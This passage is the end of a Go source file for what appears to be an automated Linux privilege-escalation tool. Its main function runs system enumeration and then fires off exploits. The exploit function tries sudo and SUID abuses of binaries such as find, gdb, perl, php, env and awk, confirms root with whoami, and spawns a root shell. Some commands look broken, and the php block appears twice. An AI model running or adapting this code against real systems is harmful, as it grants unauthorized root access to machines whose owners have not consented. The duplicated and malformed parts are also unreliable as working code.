            fmt.Println("dash exploit failed")
       }
    }

    if slice_contains(vul_sid, "env") {
        env_suid_test := longer_cmd(fmt.Sprintf(`sudo env whoami`))
        if env_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo env /bin/bash`))
        } else if env_suid_test != "root\n"{
            fmt.Println("env exploit failed")
       }
    }

    if slice_contains(vul_sid, "expect") {
        expect_suid_test := longer_cmd(fmt.Sprintf(`expect -c 'spawn whoami;interact'`))
        if strings.Contains(expect_suid_test,"root\n" ) {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo expect -c 'spawn /bin/sh -p;interact'`))
        } else if expect_suid_test != "root\n" {
            fmt.Println("expect suid exploit failed")
        }
    }

    if slice_contains(vul_sid, "find") {
        find_suid_test := longer_cmd(fmt.Sprintf(`sudo find . -exec whoami \; -quit`))
        if find_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo find . -exec /bin/sh \; -quit`))
        } else if find_suid_test != "root\n"{
            fmt.Println("find exploit failed")
       }
    }

    if slice_contains(vul_sid, "fish") {
        fish_suid_test := longer_cmd(fmt.Sprintf(`sudo fish -c 'whoami'`))
        if fish_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo fish`))
        } else if fish_suid_test != "root\n"{
            fmt.Println("fish exploit failed")
       }
    }

    if slice_contains(vul_sid, "flock") {
        flock_suid_test := longer_cmd(fmt.Sprintf(`sudo flock -u / whoami`))
        if flock_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo flock -u / /bin/bash`))
        } else if flock_suid_test != "root\n"{
            fmt.Println("flock exploit failed")
       }
    }

    if slice_contains(vul_sid, "gdb") {
        gdb_suid_test := longer_cmd(fmt.Sprintf(`sudo gdb -q -nx -ex 'python import os; os.system("whoami")' -ex quit`))
        if gdb_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo gdb -q -nx -ex 'python import os; os.system("/bin/bash")' -ex quit`))
        } else if gdb_suid_test != "root\n"{
            fmt.Println("gdb exploit failed")
       }
    }

    if slice_contains(vul_sid, "genie") {
        genie_suid_test := longer_cmd(fmt.Sprintf(`sudo genie -c "whoami"`))
        if genie_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo genie -c "/bin/bash"`))
        } else if genie_suid_test != "root\n"{
            fmt.Println("genie exploit failed")
       }
    }

    if slice_contains(vul_sid, "ionice") {
        ionice_suid_test := longer_cmd(fmt.Sprintf(`sudo ionice whoami`))
        if ionice_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo ionice /bin/bash`))
        } else if ionice_suid_test != "root\n"{
            fmt.Println("ionice exploit failed")
       }
    }

    if slice_contains(vul_sid, "ksh") {
        ksh_suid_test := longer_cmd(fmt.Sprintf(`sudo ksh -c "whoami"`))
        if ksh_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo ksh`))
        } else if ksh_suid_test != "root\n"{
            fmt.Println("ksh exploit failed")
       }
    }

    if slice_contains(vul_sid, "logsave") {
        logsave_suid_test := longer_cmd(fmt.Sprintf(`sudo logsave /dev/null whoami"`))
        if logsave_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo logsave /dev/null /bin/bash -i`))
        } else if logsave_suid_test != "root\n"{
            fmt.Println("logsave exploit failed")
       }
    }

    if slice_contains(vul_sid, "lua") {
        lua_suid_test := longer_cmd(fmt.Sprintf(`sudo lua -e 'os.execute("whoami")'`))
        if lua_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`lua -e 'os.execute("/bin/bash")'`))
        } else if lua_suid_test != "root\n"{
            fmt.Println("lua exploit failed")
       }
    }

    if slice_contains(vul_sid, "mawk") {
        mawk_suid_test := longer_cmd(fmt.Sprintf(`sudo mawk 'BEGIN' {system("whoami")}`))
        if mawk_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo mawk 'BEGIN' {system("/bin/bash")}`))
        } else if mawk_suid_test != "root\n"{
            fmt.Println("mawk exploit failed")
       }
    }

    if slice_contains(vul_sid, "multitime") {
        multitime_suid_test := longer_cmd(fmt.Sprintf(`sudo multitime whoami`))
        if multitime_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo multitime /bin/sh`))
        } else if multitime_suid_test != "root\n"{
            fmt.Println("multitime exploit failed")
       }
    }

    if slice_contains(vul_sid, "nawk") {
        nawk_suid_test := longer_cmd(fmt.Sprintf(`sudo nawk 'BEGIN {system("whoami")}'`))
        if nawk_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo nawk 'BEGIN {system("/bin/bash")}'`))
        } else if nawk_suid_test != "root\n"{
            fmt.Println("nawk exploit failed")
       }
    }

    if slice_contains(vul_sid, "nice") {
        nice_suid_test := longer_cmd(fmt.Sprintf(`sudo nice whoami`))
        if nice_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo nice /bin/bash`))
        } else if nice_suid_test != "root\n"{
            fmt.Println("nice exploit failed")
       }
    }

    if slice_contains(vul_sid, "perl") {
        perl_suid_test := longer_cmd(fmt.Sprintf(`sudo perl -e 'exec "whoami";'`))
        if perl_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo perl -e 'exec "/bin/bash";'`))
        } else if perl_suid_test != "root\n"{
            fmt.Println("perl exploit failed")
       }
    }

    if slice_contains(vul_sid, "php") {
        php_suid_test := longer_cmd(fmt.Sprintf(`sudo php -r "pcntl_exec('/usr/bin/whoami');"`))
        if php_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo php -r "pcntl_exec('/bin/sh', ['-p']);"`))
        } else if php_suid_test != "root\n"{
            fmt.Println("php exploit failed")
       }
    }

    if slice_contains(vul_sid, "php") {
        php_suid_test := longer_cmd(fmt.Sprintf(`sudo php -r "pcntl_exec('/usr/bin/whoami');"`))
        if php_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo php -r "pcntl_exec('/bin/sh', ['-p']);"`))
        } else if php_suid_test != "root\n"{
            fmt.Println("php exploit failed")
       }
    }

}


func main() {
  var count = flag.Bool("i", false, "information only mode")
  flag.Parse()

  basic_info()
  test_env()
  fmt.Println()
  release()
  linux_exploits()
  fmt.Println()
  sudo_l()
  fmt.Println()
  users()
  net_info()
  fmt.Println()
  net_reachable()
  fmt.Println()
  weakpermissions()
  useful_software()
  fmt.Println()
  py_path_hijack()
  fmt.Println()
  suid()
  fmt.Println()
  sgid()
  fmt.Println()
  capabilites()
  fmt.Println()

  if *count == false {
      exploit_cves()
      exploit_cap()
      exploit_sid(vul_suid)
      exploit_sid(vul_sgid)
  } else if *count == true {
    fmt.Println("information mode, passing any exploits.")
  }

}